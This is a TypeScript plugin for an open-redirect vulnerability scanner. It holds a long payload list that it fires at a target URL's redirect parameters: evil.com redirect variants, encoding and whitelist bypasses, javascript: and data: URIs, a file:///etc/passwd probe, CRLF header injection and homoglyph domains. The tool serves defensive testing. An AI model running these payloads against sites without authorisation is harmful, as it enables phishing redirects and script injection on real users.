/**
 * Open Redirect Detector Tool
 * 
 * @plugin open_redirect_detector
 * @name Open Redirect Detector
 * @version 1.0.0
 * @author Sentinel Team
 * @category vuln
 * @default_severity medium
 * @tags redirect, vulnerability, security, web, phishing
 * @description Detect open redirect vulnerabilities by testing URL parameters with various redirect payloads
 */

interface ToolInput {
    url: string;
    method?: string;
    params?: Record<string, string>;
    headers?: Record<string, string>;
    timeout?: number;
    userAgent?: string;
    followRedirects?: boolean;
    targetDomain?: string;
    testAllParams?: boolean;
}

interface RedirectTest {
    parameter: string;
    payload: string;
    payloadType: string;
    vulnerable: boolean;
    severity: "high" | "medium" | "low";
    redirectUrl?: string;
    responseCode?: number;
    evidence?: string;
    error?: string;
}

interface ToolOutput {
    success: boolean;
    data?: {
        url: string;
        method: string;
        tests: RedirectTest[];
        summary: {
            totalTests: number;
            vulnerableCount: number;
            testedParameters: string[];
            vulnerableParameters: string[];
            bySeverity: Record<string, number>;
        };
    };
    error?: string;
}

// Redirect payloads organized by type
const REDIRECT_PAYLOADS: Record<string, { payload: string; description: string }[]> = {
    basic: [
        { payload: "https://evil.com", description: "Basic HTTPS redirect" },
        { payload: "http://evil.com", description: "Basic HTTP redirect" },
        { payload: "//evil.com", description: "Protocol-relative redirect" },
        { payload: "///evil.com", description: "Triple slash redirect" },
        { payload: "////evil.com", description: "Quadruple slash redirect" },
    ],
    
    encoded: [
        { payload: "https:%2F%2Fevil.com", description: "URL encoded slashes" },
        { payload: "https:%252F%252Fevil.com", description: "Double URL encoded" },
        { payload: "https%3A%2F%2Fevil.com", description: "Fully URL encoded" },
        { payload: "https%3A//evil.com", description: "Partially encoded colon" },
        { payload: "%2F%2Fevil.com", description: "Encoded protocol-relative" },
        { payload: "%252F%252Fevil.com", description: "Double encoded protocol-relative" },
    ],
    
    bypass: [
        { payload: "https://evil.com/", description: "Trailing slash" },
        { payload: "https://evil.com//", description: "Double trailing slash" },
        { payload: "https://evil.com?", description: "Trailing question mark" },
        { payload: "https://evil.com#", description: "Trailing hash" },
        { payload: "https://evil.com%00", description: "Null byte" },
        { payload: "https://evil.com%0d%0a", description: "CRLF injection" },
        { payload: "https://evil.com%09", description: "Tab character" },
        { payload: "https://evil.com%20", description: "Space character" },
    ],
    
    domain_bypass: [
        { payload: "https://evil.com@legitimate.com", description: "Basic auth bypass" },
        { payload: "https://legitimate.com@evil.com", description: "Reversed basic auth" },
        { payload: "https://evil.com#legitimate.com", description: "Fragment bypass" },
        { payload: "https://evil.com?legitimate.com", description: "Query bypass" },
        { payload: "https://evil.com\\legitimate.com", description: "Backslash bypass" },
        { payload: "https://evil.com%23legitimate.com", description: "Encoded hash bypass" },
        { payload: "https://evil.com%40legitimate.com", description: "Encoded @ bypass" },
    ],
    
    whitelist_bypass: [
        { payload: "https://legitimate.com.evil.com", description: "Subdomain of attacker" },
        { payload: "https://legitimatecom.evil.com", description: "Missing dot subdomain" },
        { payload: "https://evil.com/legitimate.com", description: "Path bypass" },
        { payload: "https://evil.com?url=legitimate.com", description: "Query param bypass" },
        { payload: "https://evil.com#legitimate.com", description: "Fragment bypass" },
        { payload: "https://evil-legitimate.com", description: "Hyphen bypass" },
        { payload: "https://legitimate.evil.com", description: "Subdomain bypass" },
    ],
    
    protocol: [
        { payload: "javascript:alert(1)", description: "JavaScript protocol" },
        { payload: "javascript://evil.com/%0aalert(1)", description: "JavaScript with comment" },
        { payload: "data:text/html,<script>alert(1)</script>", description: "Data URI" },
        { payload: "vbscript:msgbox(1)", description: "VBScript protocol" },
        { payload: "file:///etc/passwd", description: "File protocol" },
    ],
    
    unicode: [
        { payload: "https://ⓔⓥⓘⓛ.ⓒⓞⓜ", description: "Unicode domain" },
        { payload: "https://evil。com", description: "Fullwidth dot" },
        { payload: "https://evil%E3%80%82com", description: "Encoded fullwidth dot" },
        { payload: "https://еvil.com", description: "Cyrillic 'e'" },
        { payload: "https://evіl.com", description: "Cyrillic 'i'" },
    ],
    
    special: [
        { payload: "/\\evil.com", description: "Backslash prefix" },
        { payload: "\\/evil.com", description: "Escaped slash" },
        { payload: "/.evil.com", description: "Dot prefix" },
        { payload: "/evil.com", description: "Single slash prefix" },
        { payload: "evil.com", description: "No protocol" },
        { payload: ".evil.com", description: "Dot prefix no slash" },
        { payload: "..evil.com", description: "Double dot prefix" },
    ],
    
    header_injection: [
        { payload: "https://evil.com%0d%0aSet-Cookie:session=evil", description: "Header injection via redirect" },
        { payload: "https://evil.com%0aX-Injected:header", description: "Custom header injection" },
    ],
};

// Common redirect parameter names
const REDIRECT_PARAM_NAMES = [
    "url", "uri", "redirect", "redirect_uri", "redirect_url", "redirectUrl", "redirectUri",
    "return", "return_url", "returnUrl", "return_uri", "returnUri", "returnTo",
    "next", "next_url", "nextUrl", "next_uri", "nextUri",
    "target", "target_url", "targetUrl", "target_uri", "targetUri",
    "dest", "destination", "dest_url", "destUrl", "destination_url", "destinationUrl",
    "redir", "redir_url", "redirUrl",
    "continue", "continue_url", "continueUrl",
    "forward", "forward_url", "forwardUrl",
    "goto", "go", "go_url", "goUrl",
    "link", "link_url", "linkUrl",
    "out", "out_url", "outUrl",
    "view", "view_url", "viewUrl",
    "login", "login_url", "loginUrl",
    "logout", "logout_url", "logoutUrl",
    "callback", "callback_url", "callbackUrl",
    "checkout", "checkout_url", "checkoutUrl",
    "image", "image_url", "imageUrl",
    "file", "file_url", "fileUrl",
    "page", "page_url", "pageUrl",
    "feed", "feed_url", "feedUrl",
    "host", "site", "domain",
    "ref", "referer", "referrer",
    "source", "src",
    "u", "r", "l", "q",
];

/**
 * Export input schema
 */
export function get_input_schema() {
    return {
        type: "object",
        required: ["url"],
        properties: {
            url: {
                type: "string",
                description: "Target URL with potential redirect parameters"
            },
            method: {
                type: "string",
                enum: ["GET", "POST"],
                description: "HTTP method",
                default: "GET"
            },
            params: {
                type: "object",
                description: "URL parameters to test (key-value pairs)",
                additionalProperties: { type: "string" }
            },
            headers: {
                type: "object",
                description: "Custom headers to include",
                additionalProperties: { type: "string" }
            },
            timeout: {
                type: "integer",
                description: "Request timeout in milliseconds",
                default: 10000,
                minimum: 1000,
                maximum: 30000
            },
            userAgent: {
                type: "string",
                description: "Custom User-Agent header"
            },
            followRedirects: {
                type: "boolean",
                description: "Follow redirects to verify destination",
                default: false
            },
            targetDomain: {
                type: "string",
                description: "Target domain to use in whitelist bypass payloads (extracted from URL if not provided)"
            },
            testAllParams: {
                type: "boolean",
                description: "Test all parameters, not just those with redirect-like names",
                default: false
            }
        }
    };
}

globalThis.get_input_schema = get_input_schema;

/**
 * Parse URL and extract parameters
 */
function parseUrl(url: string): { baseUrl: string; params: Record<string, string> } {
    try {
        const urlObj = new URL(url);
        const params: Record<string, string> = {};
        urlObj.searchParams.forEach((value, key) => {
            params[key] = value;
        });
        return {
            baseUrl: `${urlObj.origin}${urlObj.pathname}`,
            params,
        };
    } catch {
        return { baseUrl: url, params: {} };
    }
}

/**
 * Build URL with parameters
 */
function buildUrl(baseUrl: string, params: Record<string, string>): string {
    const url = new URL(baseUrl);
    for (const [key, value] of Object.entries(params)) {
        url.searchParams.set(key, value);
    }
    return url.toString();
}

/**
 * Extract domain from URL
 */
function extractDomain(url: string): string {
    try {
        const urlObj = new URL(url);
        return urlObj.hostname;
    } catch {
        return "";
    }
}

/**
 * Identify redirect-like parameters
 */
function identifyRedirectParams(params: Record<string, string>, testAll: boolean): string[] {
    if (testAll) {
        return Object.keys(params);
    }
    
    const redirectParams: string[] = [];
    
    for (const key of Object.keys(params)) {
        const lowerKey = key.toLowerCase();
        
        // Check if parameter name suggests redirect
        if (REDIRECT_PARAM_NAMES.some(name => lowerKey === name.toLowerCase() || lowerKey.includes(name.toLowerCase()))) {
            redirectParams.push(key);
            continue;
        }
        
        // Check if value looks like URL
        const value = params[key];
        if (value.startsWith("http://") || value.startsWith("https://") || value.startsWith("//") || value.startsWith("/")) {
            redirectParams.push(key);
        }
    }
    
    return redirectParams;
}

/**
 * Generate payloads with target domain for whitelist bypass
 */
function generatePayloads(targetDomain: string): { payload: string; type: string }[] {
    const payloads: { payload: string; type: string }[] = [];
    
    // Add basic payloads
    for (const p of REDIRECT_PAYLOADS.basic) {
        payloads.push({ payload: p.payload, type: "basic" });
    }
    
    // Add encoded payloads
    for (const p of REDIRECT_PAYLOADS.encoded) {
        payloads.push({ payload: p.payload, type: "encoded" });
    }
    
    // Add bypass payloads
    for (const p of REDIRECT_PAYLOADS.bypass) {
        payloads.push({ payload: p.payload, type: "bypass" });
    }
    
    // Add domain bypass payloads with target domain
    for (const p of REDIRECT_PAYLOADS.domain_bypass) {
        const payload = p.payload.replace(/legitimate\.com/g, targetDomain);
        payloads.push({ payload, type: "domain_bypass" });
    }
    
    // Add whitelist bypass payloads with target domain
    for (const p of REDIRECT_PAYLOADS.whitelist_bypass) {
        const payload = p.payload.replace(/legitimate\.com/g, targetDomain).replace(/legitimate/g, targetDomain.split(".")[0]);
        payloads.push({ payload, type: "whitelist_bypass" });
    }
    
    // Add protocol payloads (limited)
    payloads.push({ payload: "javascript:alert(1)", type: "protocol" });
    payloads.push({ payload: "//evil.com", type: "protocol" });
    
    // Add special payloads
    for (const p of REDIRECT_PAYLOADS.special) {
        payloads.push({ payload: p.payload, type: "special" });
    }
    
    return payloads;
}

/**
 * Check if redirect is to external domain
 */
function isExternalRedirect(originalDomain: string, redirectUrl: string): boolean {
    try {
        const redirectDomain = extractDomain(redirectUrl);
        if (!redirectDomain) return false;
        
        // Check if redirect is to a different domain
        return redirectDomain !== originalDomain && 
               !redirectDomain.endsWith(`.${originalDomain}`) &&
               redirectDomain !== "evil.com" && // Our test domain
               !redirectDomain.endsWith(".evil.com");
    } catch {
        return false;
    }
}

/**
 * Determine severity based on payload type and redirect behavior
 */
function determineSeverity(payloadType: string, redirectsToEvil: boolean): "high" | "medium" | "low" {
    if (payloadType === "protocol" && redirectsToEvil) {
        return "high"; // JavaScript execution
    }
    if (redirectsToEvil) {
        if (payloadType === "basic" || payloadType === "encoded") {
            return "high"; // Direct redirect to attacker domain
        }
        return "medium"; // Bypass technique worked
    }
    return "low";
}

/**
 * Test a single redirect payload
 */
async function testPayload(
    baseUrl: string,
    params: Record<string, string>,
    targetParam: string,
    payload: string,
    payloadType: string,
    options: {
        method: string;
        headers: Record<string, string>;
        timeout: number;
        followRedirects: boolean;
        originalDomain: string;
    }
): Promise<RedirectTest> {
    const testParams = { ...params, [targetParam]: payload };
    const testUrl = buildUrl(baseUrl, testParams);
    
    const result: RedirectTest = {
        parameter: targetParam,
        payload,
        payloadType,
        vulnerable: false,
        severity: "low",
    };
    
    try {
        const response = await fetch(testUrl, {
            method: options.method,
            headers: options.headers,
            redirect: options.followRedirects ? "follow" : "manual",
            // @ts-ignore
            timeout: options.timeout,
        });
        
        result.responseCode = response.status;
        
        // Check for redirect response codes
        if ([301, 302, 303, 307, 308].includes(response.status)) {
            const location = response.headers.get("location");
            if (location) {
                result.redirectUrl = location;
                
                // Check if redirect goes to evil.com or external domain
                const redirectDomain = extractDomain(location);
                if (redirectDomain === "evil.com" || redirectDomain?.endsWith(".evil.com")) {
                    result.vulnerable = true;
                    result.severity = determineSeverity(payloadType, true);
                    result.evidence = `Redirects to attacker-controlled domain: ${location}`;
                } else if (isExternalRedirect(options.originalDomain, location)) {
                    result.vulnerable = true;
                    result.severity = "medium";
                    result.evidence = `Redirects to external domain: ${location}`;
                }
            }
        }
        
        // Check if followed redirect ended up at evil.com
        if (options.followRedirects && response.redirected) {
            const finalUrl = response.url;
            const finalDomain = extractDomain(finalUrl);
            if (finalDomain === "evil.com" || finalDomain?.endsWith(".evil.com")) {
                result.vulnerable = true;
                result.severity = determineSeverity(payloadType, true);
                result.redirectUrl = finalUrl;
                result.evidence = `Final redirect destination is attacker-controlled: ${finalUrl}`;
            }
        }
        
        // Check for JavaScript execution in response (for javascript: protocol)
        if (payloadType === "protocol" && payload.startsWith("javascript:")) {
            // If no redirect but response contains our payload, it might be reflected
            const body = await response.text();
            if (body.includes(payload) || body.includes("alert(1)")) {
                result.vulnerable = true;
                result.severity = "high";
                result.evidence = "JavaScript payload reflected in response";
            }
        }
        
        return result;
        
    } catch (error: any) {
        result.error = error.message || String(error);
        return result;
    }
}

/**
 * Main analysis function
 */
export async function analyze(input: ToolInput): Promise<ToolOutput> {
    try {
        // Validate input
        if (!input.url || typeof input.url !== "string") {
            return {
                success: false,
                error: "Invalid input: url parameter is required"
            };
        }
        
        const { baseUrl, params: urlParams } = parseUrl(input.url);
        const params = { ...urlParams, ...(input.params || {}) };
        
        const method = input.method || "GET";
        const timeout = input.timeout || 10000;
        const userAgent = input.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        const followRedirects = input.followRedirects === true;
        const testAllParams = input.testAllParams === true;
        const originalDomain = extractDomain(input.url);
        const targetDomain = input.targetDomain || originalDomain;
        
        const headers: Record<string, string> = {
            "User-Agent": userAgent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            ...(input.headers || {}),
        };
        
        // Identify redirect-like parameters to test
        const paramsToTest = identifyRedirectParams(params, testAllParams);
        
        if (paramsToTest.length === 0) {
            return {
                success: true,
                data: {
                    url: input.url,
                    method,
                    tests: [],
                    summary: {
                        totalTests: 0,
                        vulnerableCount: 0,
                        testedParameters: [],
                        vulnerableParameters: [],
                        bySeverity: {},
                    },
                },
            };
        }
        
        // Generate payloads
        const payloads = generatePayloads(targetDomain);
        
        // Run tests
        const tests: RedirectTest[] = [];
        
        for (const param of paramsToTest) {
            for (const { payload, type } of payloads) {
                const result = await testPayload(
                    baseUrl,
                    params,
                    param,
                    payload,
                    type,
                    { method, headers, timeout, followRedirects, originalDomain }
                );
                tests.push(result);
                
                // If we found a high severity vulnerability, we can skip some tests
                if (result.vulnerable && result.severity === "high") {
                    // Still test a few more to gather evidence
                }
            }
        }
        
        // Build summary
        const vulnerableTests = tests.filter(t => t.vulnerable);
        const vulnerableParameters = [...new Set(vulnerableTests.map(t => t.parameter))];
        const bySeverity: Record<string, number> = {};
        
        for (const test of vulnerableTests) {
            bySeverity[test.severity] = (bySeverity[test.severity] || 0) + 1;
        }
        
        return {
            success: true,
            data: {
                url: input.url,
                method,
                tests,
                summary: {
                    totalTests: tests.length,
                    vulnerableCount: vulnerableTests.length,
                    testedParameters: paramsToTest,
                    vulnerableParameters,
                    bySeverity,
                },
            },
        };
        
    } catch (error: any) {
        return {
            success: false,
            error: error instanceof Error ? error.message : String(error),
        };
    }
}

globalThis.analyze = analyze;
